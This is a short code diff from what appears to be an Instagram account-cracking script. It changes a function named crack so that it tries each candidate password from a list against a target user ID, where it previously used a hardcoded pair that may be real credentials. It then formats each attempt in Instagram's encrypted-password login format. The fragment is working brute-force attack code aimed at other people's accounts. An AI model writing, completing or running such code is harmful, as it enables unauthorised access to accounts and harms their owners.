@@ -159,8 +159,8 @@ def crack(uid, password_list, total_count):
             timestamp = int(time.time())
         
             # URL encode username and password
-            encoded_username = urllib.parse.quote('8918168736')
-            encoded_password = urllib.parse.quote('891816')
+            encoded_username = urllib.parse.quote(uid)
+            encoded_password = urllib.parse.quote(pw)
         
             # Generate encrypted password format
             encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
